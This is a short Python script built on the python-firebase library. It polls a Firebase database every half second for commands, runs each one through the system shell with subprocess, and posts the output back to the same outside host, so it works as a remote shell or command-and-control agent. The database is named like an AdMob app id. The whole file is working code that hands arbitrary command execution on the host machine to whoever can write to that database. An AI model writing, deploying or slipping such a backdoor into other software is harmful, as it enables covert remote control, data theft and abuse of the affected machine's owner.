# from REST API OF http://ozgur.github.io/python-firebase/

# Put yout username in all instances of  < /users/viveksb007  ->  /users/yourusername  >


from firebase import firebase
import subprocess
import time

user = "viveksb007"

def execmd(cmd):
    return subprocess.getoutput(cmd)

def postresponse(response):
    r = f.post('/users/'+user+'/response',response)
    print(r)

def readcmd():
    r = f.get('users/'+user+'/cmds',None)
    if r != None:
        values = list(r.values())
        print(values)
        postresponse(execmd(values[0]))
        f.delete('users/'+user+'/cmds',None)

f = firebase.FirebaseApplication("https://admob-app-id-2073089105.firebaseio.com")

while True:
    readcmd()

    time.sleep(0.5)
